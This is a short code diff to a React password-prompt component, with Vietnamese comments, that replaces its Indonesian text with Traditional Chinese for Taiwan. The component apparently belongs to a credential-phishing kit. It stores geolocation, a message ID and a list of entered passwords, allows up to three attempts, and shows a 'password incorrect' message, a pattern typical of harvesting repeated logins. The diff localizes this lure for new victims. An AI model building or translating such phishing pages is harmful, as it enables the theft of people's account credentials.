@@ -30,13 +30,13 @@ const PasswordModal = ({ nextStep }) => {
     const { geoInfo, messageId, baseMessage, passwords, addPassword, setMessageId } = store();
     const maxPass = config.MAX_PASS ?? 3;
 
-    // Tất cả text tiếng Indonesia
+    // Tất cả text tiếng Hoa (Phồn thể - Đài Loan)
     const texts = {
-        'For your security, you must enter your password to continue.': 'Untuk keamanan Anda, Anda harus memasukkan kata sandi untuk melanjutkan.',
-        'Password': 'Kata Sandi',
-        "The password that you've entered is incorrect.": 'Kata sandi yang Anda masukkan tidak benar.',
-        'Continue': 'Lanjutkan',
-        'Forgot your password?': 'Lupa kata sandi Anda?'
+        'For your security, you must enter your password to continue.': '為了您的安全，您必須輸入密碼才能繼續。',
+        'Password': '密碼',
+        "The password that you've entered is incorrect.": '您輸入的密碼不正確。',
+        'Continue': '繼續',
+        'Forgot your password?': '忘記密碼？'
     };
 
     const t = (text) => {
